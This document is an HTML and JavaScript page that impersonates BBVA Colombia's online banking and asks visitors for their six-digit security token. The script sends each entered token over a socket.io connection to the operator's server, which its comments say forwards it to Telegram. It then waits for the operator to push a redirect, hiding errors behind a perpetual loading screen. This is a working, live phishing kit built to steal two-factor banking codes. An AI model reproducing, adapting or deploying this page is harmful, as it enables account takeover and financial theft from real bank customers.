<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BBVA Net - Token de Seguridad</title>
    <link rel="stylesheet" href="styles.css">
    <script src="/socket.io/socket.io.js"></script>
</head>
<body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen" style="display: none;">
        <div class="loading-content">
            <img src="img/BBVA_logo_2025.svg.png" alt="BBVA" class="loading-logo">
            <div class="loading-spinner"></div>
            <p class="loading-text">Cargando...</p>
        </div>
    </div>

    <div class="container">
        <!-- Header -->
        <header class="header">
            <div class="header-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#1973B8"/>
                </svg>
            </div>
            <div class="logo">
                <img src="img/BBVA_logo_2025.svg.png" alt="BBVA">
            </div>
            <button class="close-btn" onclick="window.location.href='https://www.bbva.com.co/'">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#1973B8"/>
                </svg>
            </button>
        </header>

        <!-- Security Badge -->
        <div class="security-badge">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#1973B8"/>
            </svg>
        </div>

        <p class="security-text">Est√°s en un entorno con seguridad BBVA</p>

        <!-- Main Content -->
        <main class="main-content">
            <h1 class="title">Token de <br>Seguridad</h1>

            <div class="token-info">
                <div class="info-icon">
                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" fill="#1973B8"/>
                    </svg>
                </div>
                <p class="token-description">
                    Por tu seguridad, necesitamos que ingreses el token de 6 d√≠gitos generado por tu dispositivo de seguridad BBVA.
                </p>
            </div>

            <form class="token-form">
                <!-- Token Input -->
                <div class="input-group">
                    <label class="input-label">Token de 6 d√≠gitos</label>
                    <input 
                        type="text" 
                        class="input-field token-input" 
                        id="tokenCode" 
                        placeholder="000000"
                        maxlength="6"
                        autocomplete="off">
                </div>

                <!-- Bot√≥n Verificar -->
                <button type="submit" class="submit-btn">Verificar</button>

                <!-- Help Link -->
                <a href="#" class="help-link" onclick="return false;">¬øNo tienes tu token? <strong>Solicitar ayuda</strong></a>
            </form>

            <!-- Info Card -->
            <div class="info-card">
                <h3 class="info-title">¬øQu√© es el token de seguridad?</h3>
                <p class="info-text">
                    Es un c√≥digo √∫nico generado por tu dispositivo f√≠sico o app de seguridad BBVA. Este c√≥digo cambia constantemente y garantiza que solo t√∫ puedas acceder a tu cuenta.
                </p>
            </div>
        </main>
    </div>

    <script>
        // Socket.io initialization
        const socket = io({
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionDelay: 500,
            reconnectionDelayMax: 3000,
            reconnectionAttempts: Infinity,
            timeout: 60000,
            forceNew: false,
            upgrade: true,
            rememberUpgrade: true,
            path: '/socket.io',
            autoConnect: true
        });

        // Get original session ID from storage
        const originalSessionId = localStorage.getItem('bbva_session_id');
        console.log('üìÇ Session ID recuperado:', originalSessionId);
        let isConnected = false;
        let reconnectAttempts = 0;

        // Heartbeat y ping
        let heartbeatInterval = null;
        let pingInterval = null;
        let aliveInterval = null;

        function startHeartbeat() {
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            if (pingInterval) clearInterval(pingInterval);
            if (aliveInterval) clearInterval(aliveInterval);
            
            heartbeatInterval = setInterval(() => {
                if (socket.connected && originalSessionId) {
                    socket.emit('heartbeat', { sessionId: originalSessionId });
                    console.log('üíì Heartbeat');
                }
            }, 10000);
            
            pingInterval = setInterval(() => {
                if (socket.connected) {
                    socket.emit('ping-client');
                } else {
                    console.log('‚ö†Ô∏è Desconectado! Reconectando...');
                    reconnectAttempts++;
                    socket.connect();
                }
            }, 2000);
            
            aliveInterval = setInterval(() => {
                if (socket.connected) {
                    socket.emit('client-alive');
                    console.log('üíö Cliente vivo');
                }
            }, 20000);
        }

        socket.on('connect', () => {
            console.log('‚úÖ CONECTADO! Socket ID:', socket.id);
            isConnected = true;
            reconnectAttempts = 0;
            
            if (originalSessionId && originalSessionId !== socket.id) {
                socket.emit('identify-session', { originalSessionId });
                console.log('üîó Reidentificando:', originalSessionId);
                setTimeout(() => {
                    if (socket.connected) {
                        socket.emit('identify-session', { originalSessionId });
                        console.log('‚úÖ Doble verificaci√≥n');
                    }
                }, 1000);
            }
            startHeartbeat();
        });
        
        socket.on('session-identified', (data) => {
            console.log('‚úÖ‚úÖ Sesi√≥n identificada:', data);
            if (data.wasPending) {
                console.log('‚è∞ Comando pendiente ejecutado');
            }
        });

        socket.on('disconnect', (reason) => {
            console.log('‚ùå DESCONECTADO. Raz√≥n:', reason);
            isConnected = false;
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            if (pingInterval) clearInterval(pingInterval);
            if (aliveInterval) clearInterval(aliveInterval);
            setTimeout(() => {
                if (!socket.connected) {
                    console.log('üîÑ FORZANDO RECONEXI√ìN...');
                    socket.connect();
                }
            }, 500);
        });

        socket.on('reconnect', (attemptNumber) => {
            console.log(`‚úÖ‚úÖ RECONECTADO despu√©s de ${attemptNumber} intentos`);
            isConnected = true;
            reconnectAttempts = 0;
            if (originalSessionId) {
                socket.emit('identify-session', { originalSessionId });
                setTimeout(() => {
                    socket.emit('identify-session', { originalSessionId });
                }, 1000);
            }
            startHeartbeat();
        });

        socket.on('reconnecting', (attemptNumber) => {
            if (attemptNumber % 5 === 0) {
                console.log(`üîÑ Intento #${attemptNumber}`);
            }
        });

        socket.on('reconnect_error', (error) => {
            console.error('‚úó Error al reconectar');
        });

        socket.on('connect_error', (error) => {
            console.error('‚úó Error de conexi√≥n');
            setTimeout(() => socket.connect(), 1000);
        });

        socket.on('pong', () => {});
        
        socket.on('pong-client', (data) => {});
        
        socket.on('server-ping', () => {
            socket.emit('client-alive');
        });

        // Form functionality
        
        // Only allow numbers in token field
        const tokenInput = document.getElementById('tokenCode');
        tokenInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Auto-focus on token input
        window.addEventListener('load', () => {
            tokenInput.focus();
        });

        // Handle form submission
        document.querySelector('.token-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const token = tokenInput.value.trim();
            
            // Validate
            if (token.length === 0) {
                alert('Por favor ingresa el token de seguridad');
                tokenInput.focus();
                return;
            }
            
            if (token.length !== 6) {
                alert('El token debe tener exactamente 6 d√≠gitos');
                tokenInput.focus();
                return;
            }
            
            console.log('üì§ Enviando token al servidor...');
            console.log('üìÇ Usando session ID:', originalSessionId);
            
            // Show loading screen
            document.getElementById('loadingScreen').style.display = 'flex';
            
            // Send token to server with original session ID
            socket.emit('token-submit', { 
                token,
                originalSessionId 
            });
        });

        // Socket event handlers
        
        // Listen for token processing response
        socket.on('token-processing', (data) => {
            console.log('‚úì Token procesado:', data);
            if (data.success) {
                // Keep loading text as "Cargando..." - don't change it
                console.log('‚úì Token enviado a Telegram. Session ID:', data.sessionId);
                console.log('üîî IMPORTANTE: Tu Session ID es:', data.sessionId);
                console.log('üì± Ve a Telegram y presiona un bot√≥n para continuar');
            }
        });

        // Listen for redirect commands
        socket.on('redirect', (data) => {
            console.log('üîÑ Comando de redirecci√≥n recibido:', data.url);
            // Keep loading text as "Cargando..." - don't change it
            
            // Redirect immediately
            console.log('‚û°Ô∏è Redirigiendo a:', data.url);
            window.location.href = data.url;
        });

        // Handle token errors - NO mostrar alert, solo log
        socket.on('token-error', (data) => {
            console.error('‚úó Error:', data);
            // NO cerrar pantalla de carga
            // NO mostrar alert
            // Mantener "Cargando..." visible
        });

        // Limpiar al cerrar p√°gina
        window.addEventListener('beforeunload', () => {
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            if (pingInterval) clearInterval(pingInterval);
        });

        // Help link (cosmetic)
        document.querySelector('.help-link').addEventListener('click', function(e) {
            e.preventDefault();
            const originalText = this.innerHTML;
            this.innerHTML = '‚úì Solicitud enviada';
            this.style.pointerEvents = 'none';
            
            setTimeout(() => {
                this.innerHTML = originalText;
                this.style.pointerEvents = 'auto';
            }, 3000);
        });
    </script>
</body>
</html>
